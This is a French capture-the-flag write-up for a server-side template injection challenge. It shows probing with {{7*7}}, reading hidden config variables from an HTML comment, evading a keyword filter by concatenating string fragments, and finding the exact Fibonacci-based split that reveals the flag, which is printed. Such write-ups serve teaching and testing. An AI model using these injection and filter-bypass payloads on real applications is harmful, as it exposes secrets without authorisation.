# Le Bon Mot (SSTI + Filter Bypass + Split Validation)

**Flag :** `HSR{l4_plum3_3st_plus_f0rt3_qu3_l3_f1ltr3!}`

---

## Table des matières

- [Contexte](#contexte)
- [Étape 1 - Confirmer la SSTI](#étape-1---confirmer-la-ssti)
- [Étape 2 - Découvrir les variables cachées](#étape-2---découvrir-les-variables-cachées)
- [Étape 3 - Se heurter aux filtres](#étape-3---se-heurter-aux-filtres)
- [Étape 4 - Récupérer l'indice Python](#étape-4---récupérer-lindice-python)
- [Étape 5 - Analyser et exécuter le code](#étape-5---analyser-et-exécuter-le-code)
- [Étape 6 - Utiliser le bon découpage](#étape-6---utiliser-le-bon-découpage)
- [Résumé de la chaîne de résolution](#résumé-de-la-chaîne-de-résolution)

---

## Contexte

On accède à un générateur de messages personnalisés. La page indique qu'on peut utiliser `{{username}}` et `{{date}}` dans notre message.

---

## Étape 1 - Confirmer la SSTI

On entre `Bonjour {{username}} !` et on obtient `Bonjour guest !`. Les variables sont interprétées.

On teste une expression arithmétique :

```
{{7*7}}
```

Résultat : `49`. C'est une SSTI (Server-Side Template Injection).

---

## Étape 2 - Découvrir les variables cachées

En affichant le code source de la page (Ctrl+U), on trouve un commentaire HTML laissé par un développeur :

```html
<!-- debug: template vars = username, date, config{version, mode, secret_master_key, py} -->
```

On découvre qu'un objet `config` existe avec quatre propriétés : `version`, `mode`, `secret_master_key` et `py`.

On vérifie :

```
{{config.version}}
```

Résultat : `2.1.0`. L'objet `config` est bien accessible.

---

## Étape 3 - Se heurter aux filtres

On tente d'accéder au flag :

```
{{config.secret_master_key}}
```

Résultat : `Mot interdit détecté : "secret"`

Un filtre côté serveur bloque les mots sensibles. On essaie un découpage naïf en 2 parties :

```
{{config["sec" + "ret_master_key"]}}
```

Résultat : `Mot interdit détecté : "master"` - le mot `master` est aussi bloqué.

On tente un découpage en 3 parties pour casser les deux mots interdits :

```
{{config["sec" + "ret_mas" + "ter_key"]}}
```

Résultat : `Ce n'est pas tout à fait le bon mot...` - le filtre mot-par-mot est contourné, mais un second mécanisme de validation rejette notre découpage. Un seul découpage précis est accepté.

---

## Étape 4 - Récupérer l'indice Python

Le commentaire HTML mentionne une propriété `py`. On y accède :

```
{{config.py}}
```

Résultat : un code Python cryptique :

```python
def f(m):
    x,y=2,3;c=[];s=0
    while s+x<len(m):
        s+=x;c+=[s];x,y=y,x+y
    r=[];i=0
    for p in c:
        r+=[m[i:p]];i=p
    return r+[m[i:]]
```

---

## Étape 5 - Analyser et exécuter le code

On analyse le code : `x,y=2,3` puis `x,y=y,x+y` - c'est la suite de Fibonacci. La fonction découpe une chaîne aux positions cumulées de la suite (2, 5, 10, ...).

On l'exécute sur son propre PC :

```python
>>> f("secret_master_key")
['se', 'cre', 't_mas', 'ter_key']
```

---

## Étape 6 - Utiliser le bon découpage

On injecte le payload avec le découpage exact :

```
{{config["se"+"cre"+"t_mas"+"ter_key"]}}
```

Résultat :

```
HSR{l4_plum3_3st_plus_f0rt3_qu3_l3_f1ltr3!}
```

---

## Résumé de la chaîne de résolution

```
Générateur de messages
  |
  |-- {{7*7}} -> 49 (SSTI confirmée)
          |
          |-- Ctrl+U -> commentaire HTML avec les noms de variables
                    |
                    |-- {{config.secret_master_key}} -> BLOQUÉ ("secret")
                    |
                    |-- {{config["sec"+"ret_mas"+"ter_key"]}} -> "pas le bon mot"
                    |
                    |-- {{config.py}} -> code Python (Fibonacci)
                              |
                              |-- f("secret_master_key") -> ["se","cre","t_mas","ter_key"]
                                        |
                                        |-- {{config["se"+"cre"+"t_mas"+"ter_key"]}} -> flag
```
